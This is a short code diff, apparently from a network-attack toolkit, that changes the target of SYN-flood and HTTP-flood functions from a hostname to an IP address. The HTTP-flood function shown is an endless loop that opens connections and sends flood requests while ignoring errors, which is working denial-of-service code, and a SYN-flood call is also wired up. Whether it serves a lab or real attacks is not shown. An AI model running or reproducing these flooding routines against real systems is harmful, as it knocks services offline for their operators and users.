@@ -5,11 +5,11 @@ from typing import Callable
 
 from SynFlood import synflood, conf_iface
 
-from utils.consts import HOSTNAME, HOST_PORT, ATTACK_IP, ATTACK_PORT, MESSAGE, HTTP_FLOOD_REQUEST
+from utils.consts import HOSTNAME, HOST_IP, HOST_PORT, ATTACK_IP, ATTACK_PORT, MESSAGE, HTTP_FLOOD_REQUEST
 
 
 def syn_flood_attack() -> None:
-    synflood(HOSTNAME, HOST_PORT, ATTACK_IP, ATTACK_PORT, MESSAGE, conf_iface)
+    synflood(HOST_IP, HOST_PORT, ATTACK_IP, ATTACK_PORT, MESSAGE, conf_iface)
 
 
 def url_buster_attack() -> None:
@@ -26,7 +26,7 @@ def http_flood_attack() -> None:
     while True:
         with socket(AF_INET, SOCK_STREAM) as s:
             try:
-                s.connect((HOSTNAME, HOST_PORT))
+                s.connect((HOST_IP, HOST_PORT))
                 s.sendall(HTTP_FLOOD_REQUEST)
             except socket_error:
                 pass
